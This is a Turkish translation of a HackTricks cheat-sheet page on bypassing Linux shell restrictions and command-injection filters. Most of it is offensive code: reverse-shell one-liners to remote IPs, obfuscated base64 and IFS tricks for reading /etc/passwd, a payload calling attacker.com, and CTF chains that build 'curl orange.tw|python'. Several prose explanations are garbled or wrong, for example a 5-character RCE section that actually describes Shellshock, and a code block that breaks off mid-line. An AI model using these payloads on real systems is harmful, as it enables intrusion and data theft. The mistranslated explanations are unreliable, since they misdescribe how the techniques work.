# Linux Kısıtlamalarını Aşma

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmak için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> öğrenin!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek** paylaşın.

</details>

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
Dünyanın en gelişmiş topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturup otomatikleştirmek** için [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)'i kullanın.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Ortak Kısıtlamaları Aşma Yöntemleri

### Ters Kabuk
```bash
# Double-Base64 is a great way to avoid bad characters like +, works 99% of the time
echo "echo $(echo 'bash -i >& /dev/tcp/10.10.14.8/4444 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'
# echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0NEx6UTBORFFnTUQ0bU1Rbz0K|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```
### Kısa Rev shell

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Bu komut, hedef sistemde bir tersine kabuk oluşturur ve bağlantıyı belirtilen IP adresi ve port numarasına yönlendirir. Bu şekilde, saldırgan hedef sistemde komutları çalıştırabilir ve veri alışverişi yapabilir.
```bash
#Trick from Dikline
#Get a rev shell with
(sh)0>/dev/tcp/10.10.10.10/443
#Then get the out of the rev shell executing inside of it:
exec >&0
```
### Yolları Geçme ve Yasaklı Kelimeler

Bazı durumlarda, hedef sistemdeki kısıtlamaları aşmak için belirli yolları veya yasaklı kelimeleri kullanmanız gerekebilir. İşte bu tür durumlar için bazı yöntemler:

#### Yolları Geçme

- **Yol Değiştirme**: Hedef sistemdeki bir komutu, kısıtlamaları aşmak için başka bir yolla çalıştırabilirsiniz. Örneğin, `/bin/bash` yerine `/usr/bin/bash` kullanarak kısıtlamaları atlatabilirsiniz.

- **Yol Değiştirme İle Komut Çalıştırma**: Hedef sistemdeki bir komutu, kısıtlamaları aşmak için başka bir yolla çalıştırabilirsiniz. Örneğin, `ls` yerine `/bin/ls` kullanarak kısıtlamaları atlatabilirsiniz.

- **Yol İçeren Komutlar**: Hedef sistemdeki bir komutu, kısıtlamaları aşmak için yol içeren bir komutla çalıştırabilirsiniz. Örneğin, `$(which ls)` kullanarak `ls` komutunu çalıştırabilirsiniz.

#### Yasaklı Kelimeleri Geçme

- **Yasaklı Kelimeleri Değiştirme**: Hedef sistemdeki bir komutu, yasaklı kelimeleri değiştirerek çalıştırabilirsiniz. Örneğin, `cat` yerine `c\at` kullanarak yasaklı kelimeyi atlatabilirsiniz.

- **Yasaklı Kelimeleri İçeren Komutlar**: Hedef sistemdeki bir komutu, yasaklı kelimeleri içeren bir komutla çalıştırabilirsiniz. Örneğin, `$(echo c\at)` kullanarak `cat` komutunu çalıştırabilirsiniz.

Bu yöntemler, hedef sistemin kısıtlamalarını aşmanıza yardımcı olabilir. Ancak, bu tür işlemleri gerçekleştirirken dikkatli olmalı ve yasalara uygun olarak hareket etmelisiniz.
```bash
# Question mark binary substitution
/usr/bin/p?ng # /usr/bin/ping
nma? -p 80 localhost # /usr/bin/nmap -p 80 localhost

# Wildcard(*) binary substitution
/usr/bin/who*mi # /usr/bin/whoami

# Wildcard + local directory arguments
touch -- -la # -- stops processing options after the --
ls *
echo * #List current files and folders with echo and wildcard

# [chars]
/usr/bin/n[c] # /usr/bin/nc

# Quotes
'p'i'n'g # ping
"w"h"o"a"m"i # whoami
ech''o test # echo test
ech""o test # echo test
bas''e64 # base64

#Backslashes
\u\n\a\m\e \-\a # uname -a
/\b\i\n/////s\h

# $@
who$@ami #whoami

# Transformations (case, reverse, base64)
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi") #whoami -> Upper case to lower case
$(a="WhOaMi";printf %s "${a,,}") #whoami -> transformation (only bash)
$(rev<<<'imaohw') #whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==) #base64


# Execution through $0
echo whoami|$0

# Uninitialized variables: A uninitialized variable equals to null (nothing)
cat$u /etc$u/passwd$u # Use the uninitialized variable without {} before any symbol
p${u}i${u}n${u}g # Equals to ping, use {} to put the uninitialized variables between valid characters

# Fake commands
p$(u)i$(u)n$(u)g # Equals to ping but 3 errors trying to execute "u" are shown
w`u`h`u`o`u`a`u`m`u`i # Equals to whoami but 5 errors trying to execute "u" are shown

# Concatenation of strings using history
!-1 # This will be substitute by the last command executed, and !-2 by the penultimate command
mi # This will throw an error
whoa # This will throw an error
!-1!-2 # This will execute whoami
```
### Yasaklı boşlukları atlayın

Bazı durumlarda, bir komutu çalıştırmak için yasaklanmış karakterlerden kaçınmanız gerekebilir. Bu durumda, yasaklı boşlukları atlamak için aşağıdaki yöntemleri kullanabilirsiniz:

- **Yatay Tab (Tab)**: Komutu tamamlamak için yatay sekme karakterini kullanabilirsiniz. Örneğin, `ls` komutunu çalıştırmak için `l` harfini yazdıktan sonra yatay sekme karakterini ekleyebilirsiniz.

- **Dikey Tab (Vertical Tab)**: Dikey sekme karakterini kullanarak yasaklı boşlukları atlayabilirsiniz. Örneğin, `ls` komutunu çalıştırmak için `l` harfini yazdıktan sonra dikey sekme karakterini ekleyebilirsiniz.

- **Unicode Karakterleri**: Unicode karakterlerini kullanarak yasaklı boşlukları atlayabilirsiniz. Örneğin, `ls` komutunu çalıştırmak için `l` harfini yazdıktan sonra bir Unicode karakteri ekleyebilirsiniz.

Bu yöntemler, yasaklı boşlukları atlamak için kullanılabilecek bazı basit tekniklerdir. Ancak, her durumda işe yaramayabilir ve kullanılabilirlikleri sistem yapılandırmasına bağlı olabilir.
```bash
# {form}
{cat,lol.txt} # cat lol.txt
{echo,test} # echo test

# IFS - Internal field separator, change " " for any other character ("]" in this case)
cat${IFS}/etc/passwd # cat /etc/passwd
cat$IFS/etc/passwd # cat /etc/passwd

# Put the command line in a variable and then execute it
IFS=];b=wget]10.10.14.21:53/lol]-P]/tmp;$b
IFS=];b=cat]/etc/passwd;$b # Using 2 ";"
IFS=,;`cat<<<cat,/etc/passwd` # Using cat twice
#  Other way, just change each space for ${IFS}
echo${IFS}test

# Using hex format
X=$'cat\x20/etc/passwd'&&$X

# Using tabs
echo "ls\x09-l" | bash

# New lines
p\
i\
n\
g # These 4 lines will equal to ping

# Undefined variables and !
$u $u # This will be saved in the history and can be used as a space, please notice that the $u variable is undefined
uname!-1\-a # This equals to uname -a
```
### Ters bölü ve bölü işaretlerini atlatma

Bazı durumlarda, bir komutu çalıştırmak için ters bölü (\) veya bölü (/) işaretlerini atlatmanız gerekebilir. İşte bu işaretleri atlatmanın bazı yöntemleri:

- Ters bölü işaretini atlatmak için, komutunuzda ters bölü işaretinden önce başka bir ters bölü işareti ekleyin. Örneğin, `ls \\-l` komutunu kullanarak `ls -l` komutunu çalıştırabilirsiniz.
- Bölü işaretini atlatmak için, komutunuzda bölü işaretinden önce ters bölü işareti ekleyin. Örneğin, `cd \/tmp` komutunu kullanarak `cd /tmp` komutunu çalıştırabilirsiniz.

Bu yöntemler, ters bölü ve bölü işaretlerini atlatmanıza yardımcı olacaktır.
```bash
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '!-0' '"-1')etc$(echo . | tr '!-0' '"-1')passwd
```
### Pipe'ları Atlatma

Bazı durumlarda, bir komutun çıktısını başka bir komuta yönlendirmek için pipe (`|`) kullanmak engellenebilir. Ancak, bu engellemeyi aşmanın bazı yolları vardır.

#### 1. Process Substitution (İşlem Yerine Koyma)

Process substitution, bir komutun çıktısını bir dosya gibi işlemek için kullanılır. Bu yöntem, pipe kullanmadan komutlar arasında veri akışını sağlar.

```bash
command1 <(command2)
```

Örnek:

```bash
cat <(ls)
```

#### 2. Named Pipes (Adlandırılmış Pipe'lar)

Named pipes, bir dosya gibi davranan özel bir dosya türüdür. Bu yöntemle, bir komutun çıktısı bir named pipe'a yönlendirilir ve başka bir komut da bu named pipe'dan veri alır.

```bash
mkfifo /tmp/pipe
command1 > /tmp/pipe &
command2 < /tmp/pipe
```

Örnek:

```bash
mkfifo /tmp/pipe
ls > /tmp/pipe &
cat < /tmp/pipe
```

#### 3. Process Substitution with Named Pipes (İşlem Yerine Koyma ile Adlandırılmış Pipe'lar)

Process substitution ve named pipes yöntemleri birleştirilerek, pipe kullanmadan komutlar arasında veri akışı sağlanabilir.

```bash
command1 <(command2 > /tmp/pipe) < /tmp/pipe
```

Örnek:

```bash
cat <(ls > /tmp/pipe) < /tmp/pipe
```

#### 4. File Descriptor Manipulation (Dosya Tanımlayıcı Manipülasyonu)

Dosya tanımlayıcı manipülasyonu, bir komutun çıktısını bir dosya tanımlayıcısına yönlendirmek için kullanılır. Bu yöntemle, pipe kullanmadan komutlar arasında veri akışı sağlanabilir.

```bash
command1 3>&1 1>&2 2>&3 | command2
```

Örnek:

```bash
ls 3>&1 1>&2 2>&3 | cat
```

#### 5. Shell Variable (Kabuk Değişkeni)

Bazı durumlarda, bir komutun çıktısını bir shell değişkenine atayarak pipe engellemesi aşılabilir.

```bash
variable=$(command)
```

Örnek:

```bash
files=$(ls)
```

Bu yöntemle, `variable` adlı bir shell değişkeni oluşturulur ve `command` komutunun çıktısı bu değişkene atanır.

#### 6. Temporary File (Geçici Dosya)

Bir komutun çıktısını bir geçici dosyaya yönlendirmek ve başka bir komutun bu dosyadan veri almasını sağlamak da bir seçenektir.

```bash
command1 > /tmp/file
command2 < /tmp/file
```

Örnek:

```bash
ls > /tmp/file
cat < /tmp/file
```

Bu yöntemle, `command1` komutunun çıktısı `/tmp/file` adlı bir geçici dosyaya yönlendirilir ve `command2` komutu bu dosyadan veri alır.
```bash
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```
### Hex kodlama ile atlatma

Bazı durumlarda, bir komutun yasaklandığı veya engellendiği bir senaryoda, komutu hex kodlamasıyla atlatmak mümkün olabilir. Bu yöntem, komutun karakterlerini hex değerlerine dönüştürerek çalışır.

Örneğin, `ls` komutunu hex kodlamasıyla atlatmak için aşağıdaki adımları izleyebilirsiniz:

1. `ls` komutunu hex değerlerine dönüştürün:
   ```
   echo -e "\x6c\x73"
   ```

2. Hex değerlerini bir komut olarak çalıştırın:
   ```
   $(echo -e "\x6c\x73")
   ```

Bu şekilde, `ls` komutunu hex kodlamasıyla atlatarak çalıştırabilirsiniz. Bu yöntem, bazı durumlarda etkili olabilir, ancak her zaman işe yaramayabilir.
```bash
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat abc
`echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
cat `xxd -r -p <<< 2f6574632f706173737764`
xxd -r -ps <(echo 2f6574632f706173737764)
cat `xxd -r -ps <(echo 2f6574632f706173737764)`
```
### IP'leri Atlatma

Bazı durumlarda, belirli IP adreslerini atlatmak gerekebilir. Bu, bir hedef sistemdeki IP tabanlı kısıtlamaları aşmanın bir yoludur. İşte bazı kullanışlı komutlar:

#### Proxy Kullanarak IP Atlatma

Bir proxy sunucusu kullanarak IP adresinizi gizleyebilir ve hedef sistemdeki IP tabanlı kısıtlamaları atlayabilirsiniz. Aşağıdaki komutları kullanarak proxy sunucusu üzerinden bağlantı kurabilirsiniz:

```bash
export http_proxy=http://<proxy_ip>:<proxy_port>
export https_proxy=http://<proxy_ip>:<proxy_port>
```

#### IP Adresini Değiştirme

IP adresinizi değiştirerek IP tabanlı kısıtlamaları atlayabilirsiniz. Bunun için aşağıdaki komutları kullanabilirsiniz:

```bash
sudo ifconfig eth0 <new_ip_address> netmask <netmask>
```

#### IP Adresini Görmezden Gelme

Bazı durumlarda, hedef sistemdeki IP tabanlı kısıtlamaları atlamak için IP adresinizi tamamen görmezden gelebilirsiniz. Aşağıdaki komutu kullanarak bu işlemi gerçekleştirebilirsiniz:

```bash
sudo iptables -A INPUT -s <your_ip_address> -j DROP
```

Bu komut, belirtilen IP adresinden gelen tüm giriş trafiğini engeller.

#### IP Adresini Sahteleyerek Atlatma

IP adresinizi sahteleyerek IP tabanlı kısıtlamaları atlayabilirsiniz. Aşağıdaki komutları kullanarak bu işlemi gerçekleştirebilirsiniz:

```bash
sudo iptables -t nat -A POSTROUTING -j SNAT --to-source <fake_ip_address>
```

Bu komut, çıkış trafiğindeki IP adresinizi belirtilen sahte IP adresiyle değiştirir.

#### IP Adresini Yönlendirme ile Atlatma

IP adresinizi yönlendirme kullanarak IP tabanlı kısıtlamaları atlayabilirsiniz. Aşağıdaki komutları kullanarak bu işlemi gerçekleştirebilirsiniz:

```bash
sudo iptables -t nat -A PREROUTING -d <destination_ip_address> -j DNAT --to-destination <new_ip_address>
```

Bu komut, belirli bir hedef IP adresine yönlendirilen trafiği, belirtilen yeni IP adresine yönlendirir.
```bash
# Decimal IPs
127.0.0.1 == 2130706433
```
### Zaman tabanlı veri sızdırma

Bazı durumlarda, hedef sistemdeki verileri doğrudan çıkaramazsınız. Ancak, zaman tabanlı bir veri sızdırma tekniği kullanarak verileri yavaşça sızdırabilirsiniz. Bu teknik, hedef sistemdeki verileri küçük parçalara böler ve her parçayı belirli bir zaman aralığında gönderir.

Bu teknik için aşağıdaki adımları izleyebilirsiniz:

1. Verileri küçük parçalara bölün: Hedef sistemdeki verileri küçük parçalara bölmek için bir yöntem kullanın. Örneğin, bir metin dosyasını satır satır bölebilirsiniz.

2. Veri parçalarını gönderin: Her veri parçasını belirli bir zaman aralığında gönderin. Bu, hedef sistemdeki ağ trafiğini minimumda tutarak tespit edilme olasılığını azaltır.

3. Verileri birleştirin: Veri parçalarını almak için bir alıcı tarafı oluşturun ve gönderilen veri parçalarını birleştirin. Bu, orijinal veriyi elde etmenizi sağlar.

Bu teknik, hedef sistemdeki verileri yavaşça sızdırmanıza olanak tanır ve tespit edilme olasılığını azaltır. Ancak, verilerin sızdırılması zaman alabilir ve dikkatlice planlanması gereken bir süreçtir.
```bash
time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
```
### Ortam Değişkenlerinden Karakterleri Almak

Bazı durumlarda, bir kabuk betiği içindeki bazı karakterleri almak için ortam değişkenlerini kullanabilirsiniz. Bu, bazı kısıtlamaları aşmanıza yardımcı olabilir.

Bir ortam değişkeninden karakter almak için aşağıdaki komutu kullanabilirsiniz:

```bash
echo -e "Karakterler: \x24\x28\x65\x63\x68\x6F\x20\x2D\x65\x20\x27\x5C\x78\x32\x34\x27\x29"
```

Bu komut, `$(` ve `)` karakterlerini almak için `echo` komutunu kullanır. `\x` önekini kullanarak ASCII değerlerini temsil ederiz. Bu şekilde, kısıtlamaları aşmak için gerekli karakterleri alabilirsiniz.

Bu yöntem, bazı durumlarda kısıtlamaları aşmanıza yardımcı olabilir, ancak her zaman işe yaramayabilir.
```bash
echo ${LS_COLORS:10:1} #;
echo ${PATH:0:1} #/
```
### DNS veri sızdırma

Örneğin **burpcollab** veya [**pingb**](http://pingb.in) kullanabilirsiniz.

### Yerleşik Fonksiyonlar

Eğer harici fonksiyonları çalıştıramaz ve sadece **sınırlı bir dizi yerleşik fonksiyona erişiminiz varsa RCE elde etmek için**, bunu yapmanın bazı kullanışlı hileleri vardır. Genellikle **tüm yerleşikleri kullanamayacaksınız**, bu yüzden hapishaneden kaçmak için denemek için **tüm seçeneklerinizi bilmelisiniz**. Fikir [**devploit**](https://twitter.com/devploit)'den alınmıştır.\
İlk olarak, tüm [**shell yerleşiklerini**](https://www.gnu.org/software/bash/manual/html\_node/Shell-Builtin-Commands.html)** kontrol edin**. Ardından, işte bazı **öneriler**:
```bash
# Get list of builtins
declare builtins

# In these cases PATH won't be set, so you can try to set it
PATH="/bin" /bin/ls
export PATH="/bin"
declare PATH="/bin"
SHELL=/bin/bash

# Hex
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")
$(echo -e "\x2f\x62\x69\x6e\x2f\x6c\x73")

# Input
read aaa; exec $aaa #Read more commands to execute and execute them
read aaa; eval $aaa

# Get "/" char using printf and env vars
printf %.1s "$PWD"
## Execute /bin/ls
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls
## To get several letters you can use a combination of printf and
declare
declare functions
declare historywords

# Read flag in current dir
source f*
flag.txt:1: command not found: CTF{asdasdasd}

# Read file with read
while read -r line; do echo $line; done < /etc/passwd

# Get env variables
declare

# Get history
history
declare history
declare historywords

# Disable special builtins chars so you can abuse them as scripts
[ #[: ']' expected
## Disable "[" as builtin and enable it as script
enable -n [
echo -e '#!/bin/bash\necho "hello!"' > /tmp/[
chmod +x [
export PATH=/tmp:$PATH
if [ "a" ]; then echo 1; fi # Will print hello!
```
### Poliglot komut enjeksiyonu

Polyglot komut enjeksiyonu, birden fazla programlama dilinde geçerli olan bir komutu hedef sisteme enjekte etmek için kullanılan bir tekniktir. Bu teknik, hedef sistemin birden fazla programlama dilini desteklemesi durumunda kullanılabilir. Poliglot komut enjeksiyonu, hedef sisteme zarar vermek veya yetkisiz erişim elde etmek için kullanılabilir. Bu nedenle, sistemlerin bu tür saldırılara karşı korunması önemlidir.
```bash
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```
### Potansiyel regexleri atlayın

Bazı durumlarda, bir komutun çalışmasını engellemek için kullanılan regex desenlerini atlamak gerekebilir. Aşağıda, bu tür bir durumu atlamak için kullanılabilecek bazı teknikler bulunmaktadır:

- **Karakter Kaçışı**: Regex deseninde kullanılan özel karakterleri kaçış karakteriyle (\) birlikte kullanarak deseni atlayabilirsiniz. Örneğin, `\$` şeklinde bir desen, `$` karakterini aramak yerine deseni atlar.

- **Karakter Aralığı**: Regex deseninde kullanılan karakter aralığı belirteçleri ([ ]) kullanarak, belirli bir karakter kümesini atlayabilirsiniz. Örneğin, `[a-z]` şeklinde bir desen, küçük harfler arasındaki herhangi bir karakteri atlar.

- **Metakarakterlerin Kaçışı**: Regex deseninde kullanılan metakarakterleri kaçış karakteriyle (\) birlikte kullanarak deseni atlayabilirsiniz. Örneğin, `\.` şeklinde bir desen, nokta karakterini aramak yerine deseni atlar.

- **Alternatifler**: Regex deseninde alternatifler (|) kullanarak, farklı desenleri atlayabilirsiniz. Örneğin, `pattern1|pattern2` şeklinde bir desen, pattern1 veya pattern2'yi atlar.

Bu teknikler, regex desenlerini atlamak için kullanılabilecek bazı yaygın yöntemlerdir. Ancak, her durumda etkili olmayabilirler.
```bash
# A regex that only allow letters and numbers might be vulnerable to new line characters
1%0a`curl http://attacker.com`
```
### Bashfuscator

Bashfuscator, Bash betiklerini anlaşılması zor hale getirmek için kullanılan bir araçtır. Bu araç, betikleri karmaşık hale getirerek, betiklerin anlaşılmasını ve analiz edilmesini zorlaştırır. Bashfuscator, değişken adlarını rastgele karakterlerle değiştirir, gereksiz boşluklar ekler ve kodu parçalara böler. Bu sayede, betiklerin anlaşılması ve analiz edilmesi daha zor hale gelir. Bashfuscator, güvenlik testleri sırasında veya kötü niyetli saldırganlar tarafından kullanılabilir.
```bash
# From https://github.com/Bashfuscator/Bashfuscator
./bashfuscator -c 'cat /etc/passwd'
```
### 5 karakterle RCE (Uzaktan Kod Çalıştırma) 

Bazı durumlarda, hedef sistemdeki bash kısıtlamalarını aşmak için sadece 5 karakter kullanarak uzaktan kod çalıştırma saldırıları gerçekleştirebilirsiniz. Bu yöntem, hedef sistemin güvenlik önlemlerini atlamak için etkili bir yol sağlar.

Bu saldırıyı gerçekleştirmek için aşağıdaki adımları izleyin:

1. İlk olarak, hedef sistemdeki bash sürümünü kontrol edin:
```bash
$ echo $BASH_VERSION
```

2. Ardından, hedef sistemdeki bash sürümüne bağlı olarak aşağıdaki komutları kullanarak RCE saldırısını gerçekleştirin:

- Bash sürümü 4.4 veya daha düşükse:
```bash
$ env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```

- Bash sürümü 4.4 veya daha yüksekse:
```bash
$ env X='() { (a)=>\' bash -c "echo date"; cat echo
```

Bu yöntem, hedef sistemin bash sürümüne bağlı olarak farklı komutlar kullanır ve sadece 5 karakter kullanarak RCE saldırısı gerçekleştirir. Bu sayede, hedef sistemin güvenlik önlemlerini aşabilir ve uzaktan kod çalıştırabilirsiniz.
```bash
# From the Organge Tsai BabyFirst Revenge challenge: https://github.com/orangetw/My-CTF-Web-Challenges#babyfirst-revenge
#Oragnge Tsai solution
## Step 1: generate `ls -t>g` to file "_" to be able to execute ls ordening names by cration date
http://host/?cmd=>ls\
http://host/?cmd=ls>_
http://host/?cmd=>\ \
http://host/?cmd=>-t\
http://host/?cmd=>\>g
http://host/?cmd=ls>>_

## Step2: generate `curl orange.tw|python` to file "g"
## by creating the necesary filenames and writting that content to file "g" executing the previous generated file
http://host/?cmd=>on
http://host/?cmd=>th\
http://host/?cmd=>py\
http://host/?cmd=>\|\
http://host/?cmd=>tw\
http://host/?cmd=>e.\
http://host/?cmd=>ng\
http://host/?cmd=>ra\
http://host/?cmd=>o\
http://host/?cmd=>\ \
http://host/?cmd=>rl\
http://host/?cmd=>cu\
http://host/?cmd=sh _
# Note that a "\" char is added at the end of each filename because "ls" will add a new line between filenames whenwritting to the file

## Finally execute the file "g"
http://host/?cmd=sh g


# Another solution from https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
# Instead of writing scripts to a file, create an alphabetically ordered the command and execute it with "*"
https://infosec.rm-it.de/2017/11/06/hitcon-2017-ctf-babyfirst-revenge/
## Execute tar command over a folder
http://52.199.204.34/?cmd=>tar
http://52.199.204.34/?cmd=>zcf
http://52.199.204.34/?cmd=>zzz
http://52.199.204.34/?cmd=*%20/h*

# Another curiosity if you can read files of the current folder
ln /f*
## If there is a file /flag.txt that will create a hard link
## to it in the current folder
```
### 4 karakterle RCE

Bash kısıtlamalarını atlamak için kullanılan bir yöntemdir. Bu yöntem, sadece 4 karakter kullanarak Uzaktan Kod Çalıştırma (RCE) sağlar.

```bash
$ echo $0
bash
$ echo $BASH_VERSION
4.4.19(1)-release
$ echo $0-$BASH_VERSION
bash-4.4.19(1)-release
```

Bu komutlar, mevcut kabuk ve Bash sürümünü görüntüler. Bu bilgileri kullanarak, RCE gerçekleştirmek için aşağıdaki komutu kullanabilirsiniz:

```bash
$ echo ${0%/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*/*
```bash
# In a similar fashion to the previous bypass this one just need 4 chars to execute commands
# it will follow the same principle of creating the command `ls -t>g` in a file
# and then generate the full command in filenames
# generate "g> ht- sl" to file "v"
'>dir'
'>sl'
'>g\>'
'>ht-'
'*>v'

# reverse file "v" to file "x", content "ls -th >g"
'>rev'
'*v>x'

# generate "curl orange.tw|python;"
'>\;\\'
'>on\\'
'>th\\'
'>py\\'
'>\|\\'
'>tw\\'
'>e.\\'
'>ng\\'
'>ra\\'
'>o\\'
'>\ \\'
'>rl\\'
'>cu\\'

# got shell
'sh x'
'sh g'
```
## Salt-Okunur/Noexec/Distroless Atlama

Eğer **salt-okunur ve noexec korumaları** olan bir dosya sisteminde veya distroless bir konteyner içindeyseniz, hala **keyfi ikili dosyaları, hatta bir kabuğu bile çalıştırmanın yolları** vardır:

{% content-ref url="../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/" %}
[bypass-fs-protections-read-only-no-exec-distroless](../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/)
{% endcontent-ref %}

## Chroot ve Diğer Hapishaneleri Atlama

{% content-ref url="../privilege-escalation/escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](../privilege-escalation/escaping-from-limited-bash.md)
{% endcontent-ref %}

## Referanslar ve Daha Fazlası

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits)
* [https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet](https://github.com/Bo0oM/WAF-bypass-Cheat-Sheet)
* [https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0](https://medium.com/secjuice/web-application-firewall-waf-evasion-techniques-2-125995f3e7b0)
* [https://www.secjuice.com/web-application-firewall-waf-evasion/](https://www.secjuice.com/web-application-firewall-waf-evasion/)

<figure><img src="../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) kullanarak dünyanın **en gelişmiş** topluluk araçları tarafından desteklenen **iş akışlarını kolayca oluşturun ve otomatikleştirin**.\
Bugün Erişim Alın:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahramana kadar AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı yapmak veya HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**'da takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>
